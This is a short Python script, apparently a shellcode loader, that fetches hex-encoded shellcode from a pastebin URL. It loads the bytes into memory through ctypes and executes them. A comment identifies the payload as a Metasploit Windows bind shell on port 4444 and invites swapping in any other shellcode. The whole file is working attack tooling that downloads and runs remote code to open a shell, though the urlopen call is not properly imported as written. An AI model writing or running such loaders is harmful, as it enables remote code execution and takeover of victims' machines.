#!/usr/bin/python

from ctypes import *
import urllib2

URL = "http://pastebin.com/raw.php?i=48k0BXpq" # msfpayload windows/shell/bind_tcp LPORT=4444
# modify that URL for whatever shellcode you want

downloader = urlopen(URL)
paste = downloader.read()
alphanumeric = paste.replace("\r\n", "")
shellcode = bytearray.fromhex(alphanumeric)
array = create_string_buffer(shellcode, len(shellcode))
shell = cast(array, CFUNCTYPE(c_void_p))
shell()

